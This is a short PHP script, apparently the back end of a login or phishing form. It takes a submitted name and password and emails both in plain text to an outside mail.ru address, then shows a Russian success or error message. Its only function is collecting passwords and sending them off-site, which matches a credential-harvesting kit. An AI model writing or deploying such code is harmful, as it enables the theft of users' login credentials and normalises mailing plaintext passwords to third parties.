<?php 
$name = $_POST['name'];
$password = $_POST['password'];

$name = htmlspecialchars($name);
$password = htmlspecialchars($password);

$name = trim($name); 
$password = trim($password);



if (isset($name, $password) && mail('grf.23@mail.ru', 
                                    'Новое письмо с сайта', 
                                    'Имя: '.$name.'\n'. 
                                    'Пароль: '.$password.'\n', 
                                    'From: no-reply@mydomain.ru \r\n')) {
    echo('Письмо успешно отправлено!');
} else {
    echo('Есть ошибки! Проверьте данные...');
}
